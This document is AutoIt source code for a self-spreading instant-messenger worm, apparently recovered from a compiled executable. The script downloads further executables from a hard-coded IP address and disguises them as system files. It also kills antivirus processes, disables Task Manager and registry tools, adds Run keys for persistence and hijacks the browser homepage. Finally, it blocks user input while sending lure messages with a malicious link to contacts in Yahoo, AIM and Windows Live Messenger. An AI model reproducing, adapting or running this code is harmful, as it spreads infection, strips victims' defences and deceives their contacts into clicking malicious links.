; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: Z:\private\Viet8x\YMworm.au3>
; ----------------------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://thecoolpics.com/"
$link = "http://thecoolpics.com/"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\system\svchost.exe") Then
 		InetGet ("http://72.232.123.170/~anyj001/templates_c/new/YMworm.exe", @WindowsDir & "\system\svchost.exe", 0, 1)
 		Sleep(5000)
	EndIf

If Not FileExists(@WindowsDir & "\system\cmd.exe") Then
 		InetGet ("http://72.232.123.170/~anyj001/templates_c/new/worm2007.exe", @WindowsDir & "\system\cmd.exe", 0, 1)
 		Sleep(5000)
	EndIf
If Not FileExists(@WindowsDir & "\system\svchost32.exe") Then
 		InetGet ("http://72.232.123.170/~anyj001/templates_c/new/worm2007.exe", @WindowsDir & "\system\svchost32.exe", 0, 1)
 		Sleep(5000)
	EndIf

;Kill cac processes Anti-Virus
If ProcessExists("Bkav2006.exe") Then
   ProcessClose("Bkav2006.exe")
EndIf

If ProcessExists("IEProt.exe") Then
   ProcessClose("IEProt.exe")
EndIf

If ProcessExists("bdss.exe") Then
   ProcessClose("bdss.exe")
   ProcessClose("vsserv.exe")
EndIf

;Click vao Adbrite
;$title = WinGetTitle("Active marketing website for ads - Microsoft Internet Explorer", "")
;$check = WinExists ($title)
;If $check = 1 Then
;	BlockInput (1)
;	WinActivate($title)
;	WinSetState ( $title , "", @SW_MAXIMIZE)
;	$pos = MouseGetPos()
;	MouseClick("left", 400, 700, 1, 0)
;	MouseMove ( $pos[0], $pos[1] , 0)
;	BlockInput (0)
;EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\system\svchost.exe")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Yahoo Messenger", "REG_SZ", @WindowsDir & "\system\svchost32.exe")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[12]
$tin[0] = ":D who is beside you in this pic " & $link & "friendpic1.jpg so good-looking"
$tin[1] = ";) 1 of my vacation pictures " & $link & "vacation1.jpg <:-P "
$tin[2] = "hot pics this week " & $link & "hot.jpg :x"
$tin[3] = ";) 1 of my vacation pictures " & $link & "vacation2.jpg <:-P "
$tin[4] = "Screenshot of my new Ipod " & $link & "vista.jpg so cool :D"
$tin[5] = "Images shot in Iraq _ The war will never end " & $link & "Iraqwar.jpg << :("
$tin[6] = ":)) I won an iPhone. You will never believe it :O " & $link & "mylottery.jpg << "
$tin[7] = "never click into the links like something in this image " & $link & "dontclick.jpg #:-S !!! "
$tin[8] = ":( the page cannot be displayed " & $link & "error.jpg Something was wrong !!! Check it again and tell me later. THanks"
$tin[9] = "My pics " & $link & "mypics.jpg  b-( << "
$tin[10] = "New game  ;;) sexy beach 3 (man only) " & $link & "MissWorld.jpg !!  "
$tin[11] = "Do you realize who is in this image: " & $link & "who.jpg . Just think for a moment and tell me soon ;))"

; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(30000)
$tieude0 = WinGetTitle("My Computer", "")
$kiemtra0 = WinExists ($tieude0)
$tieude0x = WinGetTitle("Windows Explorer", "")
$kiemtra0x = WinExists ($tieude0x)
$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)

	If $kiemtra0 = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra0x = 1 Then
		ClipPut($website)
		BlockInput (1)
		WinActivate($tieude0x)
		Send("{F6}")
		Send("^v {ENTER}")
		BlockInput (0)
	EndIf

	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,11,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,11,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,11,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,11,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf
Sleep(900000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: Z:\private\Viet8x\YMworm.au3>
; ----------------------------------------------------------------------------

